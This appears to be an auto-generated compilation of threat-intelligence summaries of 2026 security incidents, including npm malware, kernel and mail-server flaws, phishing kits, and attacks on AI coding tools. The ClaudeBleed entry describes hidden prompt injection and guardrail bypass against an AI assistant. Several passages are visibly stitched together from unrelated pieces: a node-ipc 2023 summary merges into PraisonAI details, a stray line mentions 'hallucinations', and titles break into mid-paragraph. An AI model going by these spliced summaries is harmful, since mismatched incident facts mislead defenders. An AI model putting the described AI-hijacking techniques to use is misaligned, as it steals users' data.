doc_summary: Cybersecurity researchers have disclosed a new ad fraud and malvertising operation named Trapdoor targeting Android device users. The operation involved 455 malicious Android apps and 183 threat actor-owned command-and-control domains. Users unknowingly downloaded apps that triggered malvertising campaigns, coercing them into downloading additional threat actor-owned apps. These apps launched hidden WebViews, loaded threat actor-owned HTML5 domains, and requested ads. The campaign was self-sustaining, turning organic app installs into an illicit revenue generation cycle. At its peak, Trapdoor accounted for 659 million bid requests a day, with apps downloaded over 24 million times. Traffic primarily originated from the United States. The threat actors abused install attribution tools to enable malicious behavior only in users acquired through ad campaigns. Google has removed all identified malicious apps from the Play Store.

Delivery occurs via the Play Store, leading to exploitation as users download additional apps. Installation of secondary apps enables persistence and command and control through communication with domains. The final stage involves actions on objectives, where ad fraud is conducted to generate revenue. The operation's sophistication is evident in its use of obfuscation and anti-analysis techniques, as well as its selective activation of malicious behavior.

doc_summary: Cybersecurity researchers identified a compromised version of the Nx Console extension in the Microsoft Visual Studio Code Marketplace. The extension, isrwl.angular-console version 18.95.0, was used to deliver a multi-stage credential stealer and supply chain poisoning tool. The attack involved fetching an obfuscated payload from a dangling orphan commit in the nrwl/nx GitHub repository. The payload exfiltrated developer secrets via HTTPS, GitHub API, and DNS tunneling, and installed a Python backdoor on macOS systems. The root cause was traced to a developer's compromised machine, leading to the abuse of GitHub credentials to push malicious commits. The attack avoided machines in Russian/CIS time zones and targeted secrets from 1Password, npm, GitHub, and AWS. The payload included Sigstore integration, allowing the attacker to publish npm packages with valid cryptographic signatures. Users were advised to update to version 18.100.0 or later and rotate all credentials.

Title: Shai-Hulud Malware Attack on npm Packages

Victim.Description: Developers using npm packages, particularly those using Axios.

diamond_model_summary: The Shai-Hulud malware incident involves a threat actor using a non-obfuscated version of the malware to target npm packages. The adversary, potentially linked to TeamPCP, aims to steal developer credentials and cryptocurrency wallet data. The infrastructure includes a command-and-control server at 87e0bbc636999b.lhr.life, and the victim profile consists of developers using npm packages, particularly those using Axios. The attack leverages typosquatting and supply chain compromise techniques.
doc_summary: The Shai-Hulud malware, leaked last week, is now being used in new attacks on the Node Package Manager (npm) index. A threat actor published four malicious packages on npm, embedding one with a non-obfuscated version of Shai-Hulud targeting developer credentials, secrets, cryptocurrency wallet data, and account information. All rogue packages included routines for exfiltrating information, such as credentials and configuration files, with one package also turning systems into bots for distributed denial-of-service (DDoS) activity. Researchers at OXsecurity discovered the malicious uploads, noting the threat actor used typosquatting targeting Axios users. The package contains a clone of the Shai-Hulud malware attributed to the TeamPCP hacker group. The malware emerged on GitHub with a message from TeamPCP. The package is the first documented case of a Shai-Hulud clone on npm, an unmodified copy of the leaked source code. The malware exfiltrates data to a command-and-control server at 87e0bbc636999b.lhr.life. The package supports HTTP, TCP, and UDP floods, and TCP reset attacks. The campaigns were attributed to TeamPCP. Developers are advised to remove infected npm packages and rotate credentials.
kill_chain_summary: The Shai-Hulud malware attack on npm packages follows a structured kill chain. During reconnaissance, the threat actor likely identified npm packages with high download counts. Weaponization involved embedding the Shai-Hulud malware into npm packages. Delivery was achieved by publishing these packages to the npm index. Installation occurred when developers installed the infected packages. Command and control were established through a server at 87e0bbc636999b.lhr.life, facilitating data exfiltration. The attack's objectives included credential theft and cryptocurrency wallet data exfiltration.
pyramid_of_pain_summary: The Shai-Hulud malware attack on npm packages presents several indicators of compromise. Hash values of the malware are not specified, but the domain lhr.life is used for command and control. The infrastructure includes a command-and-control server at 87e0bbc636999b.lhr.life. The tools used include the Shai-Hulud malware, and the tactics, techniques, and procedures (TTPs) involve typosquatting and supply chain compromise. These indicators can be used to detect and mitigate the threat.

diamond_model_summary: Operation Ramz involved a coordinated effort by INTERPOL and 13 MENA countries to dismantle cybercrime infrastructure, focusing on phishing and malware threats. The operation led to numerous arrests and the identification of compromised accounts, highlighting the adversaries' use of phishing-as-a-service and malware to achieve financial gain. doc_summary: INTERPOL coordinated a cybercrime crackdown across the Middle East and North Africa (MENA) from October 2025 to February 2026, resulting in 201 arrests and the identification of 382 additional suspects. The operation, codenamed Ramz, involved 13 countries and focused on neutralizing phishing and malware threats, as well as tackling cyber scams. Algerian authorities disrupted a phishing-as-a-service operation, while Moroccan officials seized devices containing banking data used for phishing. In Oman, a server with critical vulnerabilities was disabled, and compromised devices were secured in Qatar. Jordanian police uncovered a financial fraud scam linked to human trafficking. Group-IB provided intelligence on over 5,000 compromised accounts, and Team Cymru emphasized the importance of cross-border collaboration. The operation highlighted the borderless nature of cybercrime and the need for coordinated responses.
kill_chain_summary: The kill chain for Operation Ramz involved multiple stages, starting with reconnaissance to identify targets, followed by weaponization through the development of phishing kits and malware. The final stage involved actions on objectives, including financial fraud and data exfiltration.

doc_summary: A phishing campaign targeted U.S. organizations, particularly in sectors like Education, Banking, Government, Technology, and Healthcare. This intelligence helps connect related domains, pages, and infrastructure. The campaign highlights the importance of early phishing detection and the use of interactive sandboxes to analyze suspicious emails and links. ANY.RUN offers threat intelligence solutions to expand phishing analysis capacity and improve SOC response workflows.

doc_summary: A critical vulnerability in NGINX, tracked as CVE-2026-42945, is being actively exploited. The flaw affects both NGINX Open Source and NGINX Plus, allowing potential remote code execution and server crashes. Security researcher Patrick Garrity from VulnCheck reported that attackers are using specially crafted HTTP requests to trigger a heap buffer overflow in the NGINX worker process. This vulnerability does not require authentication, making it particularly dangerous. Exploitation depends on specific rewrite configurations, and systems with ASLR disabled are at higher risk. VulnCheck and Censys data indicate approximately 5.7 million internet-facing NGINX servers could be affected. Organizations are urged to review configurations, apply patches, and enable security protections like ASLR. The incident underscores the rapid weaponization of vulnerabilities in widely used infrastructure.

The packages were published by 'deadcode09284814' and include 'axois-utils', which delivers a Golang-based DDoS botnet called Phantom Bot. The packages siphon SSH keys, environment variables, cloud credentials, system information, IP addresses, and cryptocurrency wallet data to remote servers. The attack highlights the growing threat of supply chain attacks and typo-squatting in the npm ecosystem. Users are advised to uninstall the packages, delete malicious configurations, rotate secrets, and block suspicious domains.
kill_chain_summary: The attack follows a structured kill chain starting with reconnaissance to identify npm packages for cloning. Weaponization involved using the Shai-Hulud worm and Phantom Bot. Delivery was executed through npm package downloads. Exploitation targeted the npm ecosystem. Installation involved persistence mechanisms on compromised systems. Command and control were established via C2 servers. Actions on objectives included data exfiltration and DDoS attacks.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes IP addresses and domain names used for C2 communication, as well as the tools Phantom Bot and Shai-Hulud worm. These indicators are crucial for detection and response efforts. The adversary's use of open-source malware and typo-squatting techniques highlights the need for vigilance in monitoring npm package downloads and network traffic.

Victim.Description: WordPress sites using the Avada Builder plugin.

diamond_model_summary: The incident involves vulnerabilities in the Avada Builder plugin, affecting over one million WordPress sites. The adversary could be any attacker exploiting these vulnerabilities, with the capability to perform arbitrary file reads and SQL injections. The infrastructure includes WordPress sites using the vulnerable plugin, and the victims are site administrators and users. The attack highlights the importance of timely patching and security monitoring.
doc_summary: The Avada Builder plugin, used by over one million WordPress sites, was found to have two critical vulnerabilities: an arbitrary file read flaw (CVE-2026-4782) and a SQL injection vulnerability (CVE-2026-4798). Discovered by Rafie Muhammad through the Wordfence Bug Bounty Program, these vulnerabilities allow both authenticated and unauthenticated attackers to compromise affected sites. The file read flaw affects versions up to 3.15.2, allowing attackers to read sensitive files like wp-config.php. The SQL injection flaw impacts versions up to 3.15.1, enabling time-based SQL injection attacks. Wordfence released firewall protections, and Avada issued patches in versions 3.15.2 and 3.15.3. Administrators are urged to update to version 3.15.3 to prevent data theft and site compromise.
kill_chain_summary: The attack begins with reconnaissance, where attackers identify WordPress sites using vulnerable versions of the Avada Builder plugin. Exploitation occurs through arbitrary file read and SQL injection vulnerabilities, allowing attackers to access sensitive data. The attack's objectives include data theft and potential site compromise. Detection involves monitoring for unusual file access and SQL queries, while remediation requires updating the plugin and implementing security controls.

The incident underscores the need for robust detection and response capabilities to mitigate the impact of such vulnerabilities.

doc_summary: A set of critical vulnerabilities in the n8n workflow automation platform has been identified, posing significant security risks. The vulnerabilities, tracked as CVE-2026-44789, CVE-2026-44790, and CVE-2026-44791, affect versions before 1.123.43, 2.20.7, and 2.22.1. These flaws allow attackers to achieve remote code execution and arbitrary file read, exploiting prototype pollution and argument injection techniques. The vulnerabilities require authenticated access but only low-privilege access, making them particularly dangerous in environments with multiple users. n8n has released patches, and users are advised to upgrade immediately. Temporary mitigations include restricting workflow permissions and disabling vulnerable nodes.

Title: Analysis of Fast16 Malware Targeting Nuclear Weapon Simulations

Victim.Description: The primary targets are nuclear weapons research facilities using LS-DYNA and AUTODYN software.

diamond_model_summary: The Fast16 incident involves a nation-state actor, likely the Equation Group, targeting nuclear weapons research through sophisticated malware. The malware, Fast16, is designed to tamper with specific simulation software, indicating a high level of domain knowledge and strategic intent to disrupt nuclear weapon development processes.
doc_summary: Fast16 is a Lua-based malware identified as a cyber sabotage tool targeting nuclear weapons testing simulations. Developed before Stuxnet, it was designed to corrupt uranium-compression simulations crucial for nuclear weapon design. Symantec and Carbon Black confirmed its targeting of LS-DYNA and AUTODYN applications, used for high-explosive simulations. The malware activates when material density exceeds 30 g/cm³, indicating uranium under implosion. Fast16's development dates back to 2005, predating Stuxnet by two years. Evidence links it to the Equation Group, with ties to the United States NSA. The malware features 101 hook rules, categorized into 9-10 groups, targeting different software versions. It avoids infection on systems with specific security products and spreads across networks. The incident highlights early nation-state industrial sabotage efforts.
kill_chain_summary: The Fast16 malware follows a structured kill chain, with weaponization involving the development of targeted malware to disrupt nuclear simulations. The actions on objectives stage is critical, where the malware activates under specific conditions to tamper with simulation outputs, highlighting a strategic sabotage effort by nation-state actors.
pyramid_of_pain_summary: The Fast16 incident lacks specific indicators such as hashes or IP addresses, making it challenging to apply the Pyramid of Pain effectively. The focus is on the malware's behavior and its impact on nuclear simulations, which are difficult to detect and remediate without specific IOCs.

Title: MiniPlasma Zero-Day Vulnerability in Windows Cloud Files Mini Filter Driver

Victim.Description: All Windows systems potentially affected by the MiniPlasma vulnerability.

diamond_model_summary: The MiniPlasma vulnerability represents a significant threat due to its ability to escalate privileges to SYSTEM level on Windows systems. The adversary, Chaotic Eclipse, demonstrated high sophistication by identifying and weaponizing this zero-day flaw. The capability involves exploiting a race condition in the Cloud Files Mini Filter Driver. The infrastructure details remain unspecified, but the victim scope is broad, affecting all Windows systems globally. The incident highlights the need for vigilance and timely patching to mitigate such vulnerabilities.
doc_summary: Chaotic Eclipse, a security researcher, disclosed a Windows zero-day vulnerability named MiniPlasma affecting the Cloud Files Mini Filter Driver (cldflt.sys). This flaw allows privilege escalation to SYSTEM level on fully patched Windows systems. Originally reported by Google Project Zero's James Forshaw in September 2020, it was believed to be patched in December 2020 under CVE-2020-17103. However, Chaotic Eclipse found it remains unpatched. The vulnerability is a race condition in the HsmOsBlockPlaceholderAccess routine. Will Dormann confirmed MiniPlasma's effectiveness on Windows 11 with May 2026 updates, but not on Insider Preview Canary builds. Microsoft addressed a related flaw, CVE-2025-62221, in December 2025.
kill_chain_summary: The MiniPlasma incident follows a clear kill chain progression. Initially, the vulnerability was identified and weaponized by Chaotic Eclipse, who developed a PoC exploit. The exploitation stage involves leveraging the vulnerability to gain SYSTEM privileges on Windows systems. Actions on objectives include executing commands with elevated privileges. The incident underscores the importance of addressing vulnerabilities promptly to prevent exploitation. The lack of specific delivery and command and control stages suggests a focus on local exploitation rather than remote attacks.
pyramid_of_pain_summary: The MiniPlasma vulnerability presents a challenge at the higher levels of the Pyramid of Pain. The exploit itself is a zero-day, making it difficult to detect and mitigate without specific patches. The lack of specific indicators such as hashes, IP addresses, or domains further complicates detection efforts. The primary focus for defenders should be on understanding the TTPs associated with this vulnerability and implementing robust patch management practices. The incident highlights the critical need for proactive threat intelligence and vulnerability management to address such high-impact threats.

Title: Remote Code Execution Vulnerability in Claude Code via Crafted Deeplink

Victim.Description: Users of Claude Code, particularly those on macOS, were targeted.

diamond_model_summary: The incident involves an adversary exploiting a vulnerability in Claude Code's CLI parsing logic to execute arbitrary commands. The capability was demonstrated through crafted deeplink URLs, targeting users of Claude Code, particularly on macOS. The infrastructure used involved malicious deeplink URLs, and the victims were users of Claude Code, primarily in the technology sector. The attack highlights the importance of secure parsing practices to prevent such vulnerabilities.
doc_summary: A critical vulnerability in Claude Code allowed attackers to execute arbitrary system commands through a crafted deeplink URL, exploiting a flaw in the CLI parsing logic. The issue was discovered by security researcher Joernchen and has been patched in version 2.1.118. The vulnerability originated from the eagerParseCliFlag function, which improperly parsed configuration flags, allowing attackers to inject malicious JSON settings objects. This led to remote code execution on macOS systems when users clicked on malicious claude-cli:// links. The attack bypassed workspace trust dialogs, posing a significant threat to users who had cloned trusted repositories like anthropics/claude-code. The incident highlights the dangers of naive string parsing and underscores the importance of context-aware argument parsing to prevent injection vulnerabilities.
kill_chain_summary: The attack began with the weaponization of a crafted deeplink URL exploiting a CLI parsing flaw in Claude Code. The delivery stage involved sending the malicious URL to potential victims. Exploitation occurred when the victim clicked the link, triggering arbitrary command execution. The attack bypassed workspace trust dialogs, leading to actions on objectives, such as executing commands on the victim's system. The incident underscores the need for secure parsing and prompt patching of vulnerabilities.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes the use of crafted deeplink URLs as a tool for exploitation. No specific hash values, IP addresses, or domains were identified. The primary TTP involved is the exploitation of a CLI parsing flaw, highlighting the need for secure parsing practices. The incident emphasizes the importance of context-aware argument parsing to prevent injection vulnerabilities.

Title: Tycoon2FA Phishing Kit Exploits Device-Code Phishing to Hijack Microsoft 365 Accounts

Victim.Description: Targets are users of Microsoft 365 services, potentially across various industries.

diamond_model_summary: The Tycoon2FA phishing kit represents a sophisticated adversary employing advanced phishing techniques to compromise Microsoft 365 accounts. The adversary uses Trustifi click-tracking URLs and Cloudflare Workers to deliver phishing emails, tricking victims into granting OAuth tokens to attacker-controlled devices. The infrastructure includes obfuscated JavaScript layers and legitimate-looking phishing pages. Victims are primarily users of Microsoft 365 services, with a high impact severity due to unauthorized access to sensitive data.
doc_summary: The Tycoon2FA phishing kit has been observed exploiting device-code phishing attacks to compromise Microsoft 365 accounts. It abuses Trustifi click-tracking URLs to trick victims into granting OAuth tokens to attacker-controlled devices. Despite a law enforcement operation in March, the operation quickly resumed, adding new obfuscation layers. The attack involves an invoice-themed phishing email with a Trustifi tracking URL, redirecting through Cloudflare Workers and obfuscated JavaScript layers to a fake Microsoft CAPTCHA page. The phishing page retrieves a Microsoft OAuth device code, instructing victims to enter it at microsoft.com/devicelogin, leading to unauthorized access to the victim's data. eSentire's research highlights the kit's extensive protection against security tools and recommends disabling OAuth device code flow, restricting OAuth consent permissions, and monitoring Entra logs for suspicious activity.
kill_chain_summary: The Tycoon2FA phishing attack follows a structured kill chain, starting with reconnaissance through phishing emails, weaponization with obfuscated JavaScript and Trustifi URLs, and delivery via phishing emails. Exploitation occurs when victims enter device codes on legitimate Microsoft pages, leading to installation of OAuth tokens on attacker-controlled devices. Command and control is achieved through unauthorized access to compromised accounts, and actions on objectives involve data access and exfiltration. The attack demonstrates a high level of sophistication and evasion tactics.
pyramid_of_pain_summary: The Tycoon2FA phishing kit presents significant challenges for defenders, with a focus on evasion and obfuscation. The pyramid of pain includes domain names like microsoft.com/devicelogin, tools such as Trustifi and Cloudflare Workers, and TTPs involving device-code phishing and OAuth token hijacking. The attack's sophistication and use of legitimate services make detection and mitigation difficult, emphasizing the need for advanced security measures and continuous monitoring.

diamond_model_summary: The ssh-keysign-pwn vulnerability represents a significant threat to Linux systems globally. The adversary, potentially any local user with standard privileges, can exploit a race condition in the Linux kernel to access sensitive SSH private keys and hashed passwords. The capability involves exploiting the __ptrace_may_access() function, allowing unauthorized access without elevated privileges. The infrastructure is local to affected systems, with no specific external infrastructure involved. doc_summary: A critical vulnerability in the Linux kernel, identified as CVE-2026-46333 and dubbed ssh-keysign-pwn, exposes millions of systems to unauthorized access. The flaw, a race condition in the __ptrace_may_access() function, allows unprivileged local attackers to access sensitive SSH private keys and hashed passwords in /etc/shadow. This vulnerability, existing undetected for six years, affects major Linux distributions like Ubuntu, Debian, and CentOS. Exploitation does not require elevated privileges, and a proof-of-concept exploit is publicly available. The vulnerability's impact includes impersonation attacks and offline password cracking. Linux kernel maintainers have released patches, and immediate updates are recommended.
kill_chain_summary: The ssh-keysign-pwn vulnerability follows a clear kill chain path. Exploitation occurs through a race condition in the Linux kernel, allowing local attackers to gain initial access to sensitive data. The lack of required elevated privileges simplifies the attack, enabling actions on objectives such as credential dumping and potential impersonation. Detection involves monitoring access to sensitive files and auditing ptrace permissions. Remediation requires immediate patching of affected systems and implementing strong access controls. The vulnerability's public disclosure and available proof-of-concept exploit increase the urgency for mitigation.

However, the vulnerability's reliance on a specific kernel function and process behavior provides opportunities for detection through behavioral analysis. Remediation focuses on patching and access control, addressing the root cause of the vulnerability. doc_summary: In October 2023, a supply chain attack targeted the node-ipc package, a popular Node.js module for inter-process communication. This flaw allows attackers to execute AI workflows without credentials, affecting versions 2.5.6 through 4.6.33. The root cause is a legacy Flask-based API server with authentication disabled by default, hard-coding AUTH_ENABLED = False and AUTH_TOKEN = None. doc_summary: Threat actors have been observed attempting to exploit a recently disclosed security vulnerability in PraisonAI, an open-source multi-agent orchestration framework, within four hours of public disclosure. The vulnerability, CVE-2026-44338, involves missing authentication that exposes sensitive endpoints, allowing attackers to invoke the API server's protected functionality without a token. The flaw affects all versions of the Python package from 2.5.6 through 4.6.33 and has been patched in version 4.6.34. Security researcher Shmulik Cohen discovered the bug. Sysdig reported that within three hours and 44 minutes of the advisory becoming public, a scanner identifying as CVE-Detector/1.0 probed the vulnerable endpoint on internet-exposed instances. The activity originated from IP address 146.190.133.49, with two passes spaced eight minutes apart. The first pass scanned generic disclosure paths, while the second targeted AI-agent surfaces, including PraisonAI. The rapid exploitation highlights a trend where threat actors quickly adopt newly disclosed flaws. Users are advised to apply the latest fixes, audit deployments, review billing for suspicious activity, and rotate credentials in agents.yaml.
kill_chain_summary: The kill chain for this incident begins with reconnaissance, where the adversary used CVE-Detector/1.0 to scan for vulnerable endpoints. doc_summary: A critical vulnerability in the Burst Statistics plugin for WordPress, tracked as CVE-2026-8181, has exposed over 200,000 websites to potential takeover. The flaw, discovered by Wordfence using their AI-driven PRISM platform, allows attackers to gain administrator-level access without valid credentials. The vulnerability affects versions 3.4.0 through 3.4.1.1 and was introduced on April 23, 2026. It stems from improper validation of authentication results in the plugin’s MainWP integration, allowing unauthenticated attackers to craft malicious HTTP requests using a known administrator username. Wordfence deployed firewall rules for premium users on May 8, 2026, and the plugin developer released a patched version 3.4.2 on May 12, 2026. The flaw significantly lowers the barrier to exploitation, increasing the likelihood of mass scanning and automated attacks.
kill_chain_summary: The attack begins with reconnaissance to identify vulnerable WordPress sites using the Burst Statistics plugin. Exploitation occurs through an authentication bypass, allowing attackers to gain admin access without valid credentials. The attackers can then create new admin accounts to maintain control over the site, posing a critical threat.

diamond_model_summary: The Exim CVE-2026-45185 vulnerability, known as 'Dead.Letter', represents a significant threat to mail servers using GnuTLS. The adversary's capability involves exploiting a use-after-free vulnerability in Exim's BDAT message body parsing logic. The infrastructure at risk includes Exim mail servers running vulnerable versions with GnuTLS. Victims are organizations using Exim, particularly those in the Information Technology and Telecommunications sectors. The potential impact is high, with the possibility of unauthorized access to email communications and infrastructure.
doc_summary: CVE-2026-45185, also known as 'Dead.Letter', is a critical vulnerability in the Exim mail transfer agent affecting versions 4.97 through 4.99.2 when built with GnuTLS. This use-after-free vulnerability allows unauthenticated remote code execution by exploiting Exim's handling of TLS-encrypted SMTP traffic and BDAT chunked message bodies. The flaw is triggered by sending a crafted sequence of SMTP commands that mix TLS shutdown with BDAT chunk processing. Successful exploitation can lead to complete mail server compromise, including reading or tampering with emails and deploying malware. Exim 4.99.3 includes a fix, and administrators are advised to upgrade or apply mitigations such as switching to OpenSSL or disabling BDAT/CHUNKING support.
kill_chain_summary: The Exim CVE-2026-45185 vulnerability follows a kill chain involving weaponization, exploitation, and actions on objectives. The adversary crafts exploit code targeting the use-after-free vulnerability in Exim's BDAT message body parsing logic. Exploitation occurs when the crafted SMTP command sequence triggers memory corruption, leading to remote code execution. Actions on objectives include unauthorized access to email communications, lateral movement, and potential deployment of malware. Detection and remediation efforts focus on monitoring SMTP traffic, upgrading to patched versions, and applying configuration changes.
pyramid_of_pain_summary: The Pyramid of Pain for the Exim CVE-2026-45185 vulnerability includes indicators such as crafted SMTP command sequences and memory corruption attempts. These indicators are challenging to detect and remediate, requiring advanced monitoring and analysis tools. The vulnerability's exploitation relies on specific TTPs, including use-after-free and heap memory corruption techniques. Organizations must implement robust detection and remediation strategies to mitigate the risk posed by this vulnerability, including upgrading to patched versions and applying configuration changes.

Title: KongTuke's Microsoft Teams Social Engineering Campaign

Victim.Description: Corporate networks targeted via Microsoft Teams.

diamond_model_summary: KongTuke, an initial access broker, has adapted its tactics to use Microsoft Teams for social engineering attacks. The adversary employs Unicode whitespace tricks to impersonate IT staff, convincing victims to execute a PowerShell command that delivers ModeloRAT malware. This campaign marks a shift from web-based lures to collaboration platforms, highlighting the adversary's adaptability and sophistication. The infrastructure involves Microsoft Teams and Dropbox, with the victim being corporate networks globally. The capability includes social engineering, PowerShell execution, and persistence through scheduled tasks.
doc_summary: Initial access broker KongTuke has shifted tactics to use Microsoft Teams for social engineering attacks, gaining persistent access to corporate networks in under five minutes. The threat actor convinces users to execute a PowerShell command that delivers ModeloRAT malware, previously seen in ClickFix attacks. KongTuke sells network access to ransomware operators. The campaign, active since April 2026, uses Unicode whitespace tricks to impersonate IT staff. The PowerShell command downloads a ZIP from Dropbox containing a WinPython environment to launch ModeloRAT, which collects system data and exfiltrates files. ReliaQuest notes the evolution of ModeloRAT and recommends restricting external Teams federation and using indicators of compromise for detection.
kill_chain_summary: The attack begins with reconnaissance, where KongTuke identifies potential targets within corporate networks. Weaponization involves preparing ModeloRAT for delivery. Delivery is executed via Microsoft Teams, where victims are tricked into executing a PowerShell command. Exploitation occurs as the command downloads and installs ModeloRAT. Installation is achieved through a scheduled task, ensuring persistence. Command and control are established using web protocols, allowing the adversary to communicate with compromised systems. Finally, actions on objectives involve collecting and exfiltrating data, including screenshots and files.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes domain names like dropbox.com, which are used for delivering the malware. The tools involved are PowerShell and WinPython, which facilitate the execution and installation of ModeloRAT. The TTPs include social engineering, PowerShell execution, and persistence through scheduled tasks. These elements contribute to the overall difficulty of detecting and responding to the attack, as they involve trusted platforms and sophisticated techniques. The scoring reflects the presence of these indicators, emphasizing the challenge in mitigating such threats.

These hallucinations can lead to missed threats, false positives, and incorrect solutions, impacting critical infrastructure decision-making. doc_summary: Linux distros are addressing a high-severity kernel privilege escalation vulnerability in the XFRM ESP-in-TCP subsystem. The vulnerability, part of the Dirty Frag class, affects all Linux kernels released before May 13, 2026. It involves chaining two kernel flaws: the xfrm-ESP Page-Cache Write and a RxRPC Page-Cache Write issue. CISA has issued warnings and mitigation guidance, emphasizing the risk to federal systems. Linux users are urged to apply patches or use mitigations similar to those for Dirty Frag, though this may disrupt AFS and IPsec VPNs.
kill_chain_summary: The attack chain involves exploiting a logic bug in the Linux XFRM ESP-in-TCP subsystem to achieve privilege escalation. Title: Zero-Day Vulnerabilities in Microsoft Products: YellowKey and GreenPlasma

Victim.Description: The vulnerabilities affect users of Windows 11 and Windows Server 2022/2025.

diamond_model_summary: The incident involves an anonymous cybersecurity researcher, Chaotic Eclipse, who disclosed two zero-day vulnerabilities, YellowKey and GreenPlasma, affecting Microsoft products. The adversary's motivation stems from dissatisfaction with Microsoft's vulnerability disclosure process. The capabilities demonstrated include exploiting zero-day vulnerabilities in Windows 11 and Windows Server 2022/2025. doc_summary: An anonymous cybersecurity researcher, known as Chaotic Eclipse, disclosed two zero-day vulnerabilities affecting Microsoft products. The first, YellowKey, is a BitLocker bypass vulnerability in the Windows Recovery Environment, impacting Windows 11 and Windows Server 2022/2025. It involves using specially crafted FsTx files on a USB drive to trigger a shell with BitLocker protections turned on. The second, GreenPlasma, is a privilege escalation vulnerability in the Windows Collaborative Translation Framework (CTFMON), allowing an unprivileged user to create arbitrary memory section objects. The researcher previously disclosed three Microsoft Defender zero-days and expressed dissatisfaction with Microsoft's vulnerability disclosure process. The vulnerabilities have been actively exploited, and Microsoft has been urged to address them promptly. Security researcher Will Dormann confirmed the YellowKey vulnerability, highlighting the ability of a System Volume Information\FsTx directory to modify another volume's contents. Intrinsec detailed an attack chain against BitLocker, leveraging a boot manager downgrade to bypass encryption protection. Microsoft plans to retire old PCA 2011 certificates to mitigate risks.
kill_chain_summary: The kill chain involves the weaponization of zero-day vulnerabilities, YellowKey and GreenPlasma, by the adversary Chaotic Eclipse. The exploitation stage is critical, as it involves gaining unauthorized access to systems through these vulnerabilities. The adversary's actions on objectives include achieving unauthorized access and potentially evading detection. The incident highlights the need for improved vulnerability management and response by Microsoft to mitigate the risks associated with zero-day exploits.

doc_summary: GitLab has released a critical security update on May 13, 2026, addressing 25 vulnerabilities in its Community and Enterprise Editions. The update focuses on high-impact Cross-Site Scripting (XSS) and Denial-of-Service (DoS) exploits. Four high-severity XSS bugs with a CVSS score of 8.7 were identified, stemming from improper input sanitization in features like the Analytics dashboard and global search functions. These vulnerabilities allow authenticated attackers to execute arbitrary JavaScript, potentially hijacking sessions and manipulating repositories. Additionally, three severe DoS vulnerabilities with a CVSS score of 7.5 were patched, which could be exploited without authentication to crash development servers. The update also addresses medium-severity access control issues, including a GraphQL authorization flaw (CVE-2026-1322) and a CSRF vulnerability in JiraConnect subscriptions. GitLab.com users are protected, but self-managed instances must be updated to versions 18.11.3, 18.10.6, or 18.9.7 to mitigate these risks.
kill_chain_summary: The attack begins with the exploitation of vulnerabilities in GitLab, specifically XSS and DoS exploits. doc_summary: Fragnesia is a new variant of the Dirty Frag Linux local privilege escalation vulnerability, tracked as CVE-2026-46300 with a CVSS score of 7.8. Title: Exim Use-After-Free Vulnerability CVE-2026-45185

Victim.Description: Exim servers using GnuTLS for TLS connections.

diamond_model_summary: The incident involves a critical use-after-free vulnerability in Exim's BDAT message body parsing, identified as CVE-2026-45185. The vulnerability is triggered during TLS session handling, leading to heap corruption and potential code execution. The flaw affects Exim versions 4.97 to 4.99.2 using GnuTLS. Discovered by Federico Kirschbaum of XBOW, the vulnerability has been patched in version 4.99.3. Users are advised to upgrade immediately.
doc_summary: Exim, an open-source Mail Transfer Agent for Unix-like systems, has released security updates to address a critical use-after-free vulnerability, CVE-2026-45185, also known as Dead.Letter. This vulnerability affects Exim versions 4.97 to 4.99.2 when configured with GnuTLS. Discovered by Federico Kirschbaum of XBOW, the flaw occurs during BDAT message body parsing when a TLS close_notify alert is sent before the body transfer is complete, leading to heap corruption and potential code execution. The vulnerability has been described as one of the highest-caliber bugs in Exim, requiring minimal server configuration to exploit. Exim has addressed the issue in version 4.99.3, urging users to upgrade immediately as no mitigations exist. This incident highlights the critical nature of maintaining up-to-date security patches to prevent exploitation.

diamond_model_summary: The ClaudeBleed vulnerability represents a critical security incident involving the exploitation of Anthropic's AI assistant. Attackers leverage a trust boundary violation in the Claude Chrome extension to hijack the AI and exfiltrate data. The adversary's capability includes exploiting the vulnerability to gain unauthorized access to sensitive data from Gmail, Google Drive, and GitHub. The infrastructure involves malicious Chrome extensions that inject scripts into the Claude environment. Victims are users of the Claude AI assistant, primarily in the technology sector, facing critical impact severity due to data theft and unauthorized actions.
doc_summary: A critical vulnerability named ClaudeBleed has been identified in Anthropic's AI assistant, compromising its security. The flaw in the Claude Chrome extension allows malicious add-ons to hijack the AI, even with zero declared permissions, leading to data theft from Gmail, Google Drive, and GitHub. The issue stems from a systemic trust boundary violation in the extension's architecture, where the externally_connectable manifest setting fails to authenticate specific scripts. Attackers can inject content scripts, gaining high-level privileges and issuing hidden prompts. Techniques like approval looping and perception manipulation enable attackers to bypass guardrails, exfiltrate data, and perform unauthorized actions. Despite a patch in version 1.0.70, the core vulnerability remains exploitable, highlighting the prioritization of usability over security.
kill_chain_summary: The ClaudeBleed incident follows a structured kill chain, beginning with the weaponization of malicious Chrome extensions exploiting the vulnerability. Delivery occurs through the deployment of these extensions to target systems. Exploitation involves leveraging the trust boundary violation to execute malicious scripts. Installation is achieved by embedding scripts within the Claude environment. Command and control are maintained through the injected scripts, allowing attackers to issue commands to the AI assistant. Actions on objectives include data exfiltration and unauthorized actions, such as summarizing emails and stealing files from Google Drive and GitHub.

Title: Critical Vulnerability in Cline AI Kanban Package Exposes Developers to RCE and Data Theft

Victim.Description: Developers using the Cline AI coding assistant's kanban package are at risk.
Victim.Security_Posture: Vulnerable due to missing authentication and origin validation.

diamond_model_summary: The incident involves a critical vulnerability in the Cline AI kanban package, allowing adversaries to execute remote code, steal data, and perform denial-of-service attacks. The adversary exploits WebSocket vulnerabilities, targeting developers using the kanban package. The attack infrastructure includes malicious websites that exploit the vulnerability, and the adversary's capabilities include executing arbitrary commands and exfiltrating data. The victim profile includes developers in the technology sector, with assets such as developer workstations and local kanban servers at risk.
doc_summary: A critical security vulnerability, CVE-2026-44211, in the Cline AI coding assistant's kanban package exposes developers to remote code execution, data theft, and denial-of-service attacks. Disclosed by security researcher Sagilayani, the flaw affects all versions before v2.13.0 and has a CVSS v3.1 score of 9.3. The vulnerability arises from missing authentication and origin validation in WebSocket connections, allowing attackers to connect to the kanban server on 127.0.0.1:3484 without restriction. The attack involves info leak, session detection, terminal hijack, and task termination. No patch is available, and the vulnerability affects macOS, Linux, and Windows systems. Mitigations include validating the Origin header, generating a random secret token, and adding authentication checks.
